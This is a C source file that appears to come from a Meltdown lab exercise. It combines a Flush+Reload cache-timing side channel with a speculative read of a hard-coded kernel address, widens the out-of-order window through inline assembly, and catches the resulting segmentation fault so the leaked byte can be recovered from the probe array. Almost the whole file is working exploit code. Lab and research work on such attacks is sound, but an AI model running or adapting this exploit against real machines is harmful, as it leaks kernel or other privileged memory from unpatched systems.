#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>

/*********************** Flush + Reload ************************/
uint8_t array[256*4096];
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void flushSideChannel()
{
  int i;
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
}

void reloadSideChannel() 
{
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for(i = 0; i < 256; i++){
     addr = &array[i*4096 + DELTA];
     time1 = __rdtscp(&junk);
     junk = *addr;
     time2 = __rdtscp(&junk) - time1;
     if (time2 <= CACHE_HIT_THRESHOLD){
         printf("array[%d*4096 + %d] is in cache.\n",i,DELTA);
         printf("The Secret = %d (%c).\n",i,i);
     }
  }	
}
/*********************** Flush + Reload ************************/

void meltdown_asm(unsigned long kernel_data_addr)
{
   char kernel_data = 0;
   
   // 关键：增加乱序执行窗口
   asm volatile(
       ".rept 400;"                
       "add $0x141, %%eax;"
       ".endr;"                    
       :
       :
       : "eax"
   ); 
    
   // 触发异常，但在乱序执行中会继续
   kernel_data = *(char*)kernel_data_addr;  
   // 关键：使用实际读取的数据作为索引
   array[kernel_data * 4096 + DELTA] += 1;           
}

// signal handler
static sigjmp_buf jbuf;
static void catch_segv()
{
  siglongjmp(jbuf, 1);
}

// MeltdownExperiment.c
int main() {
  // Register a signal handler
  signal(SIGSEGV, catch_segv);
  int fd = open("/proc/secret_data", O_RDONLY);
  if (fd < 0) {
  	perror("open");
  	return -1;
  }
  // FLUSH the probing array
  flushSideChannel();
  int ret = pread(fd, NULL, 0, 0);
  if (sigsetjmp(jbuf, 1) == 0) {
     meltdown_asm(0xf862e000);                
  } else {
      printf("Memory access violation!\n");
  }
  // RELOAD the probing array
  reloadSideChannel();                     
  return 0;
}